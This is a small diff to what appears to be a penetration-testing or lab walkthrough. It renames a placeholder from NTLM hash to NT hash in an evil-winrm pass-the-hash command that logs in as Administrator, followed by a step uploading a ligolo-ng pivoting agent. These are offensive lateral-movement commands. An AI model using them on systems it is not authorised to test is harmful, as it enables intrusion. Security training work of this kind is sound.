@@ -134,7 +134,7 @@ The following situation is given:
 To achieve that, we can do the following:
 ```shell
 # Connect with evil-winrm
-evil-winrm -i 172.16.150.10 -u Administrator -H <NTLM_hash>
+evil-winrm -i 172.16.150.10 -u Administrator -H <NT_hash>
 
 # Upload ligolo-ng agent.exe
 upload agent.exe
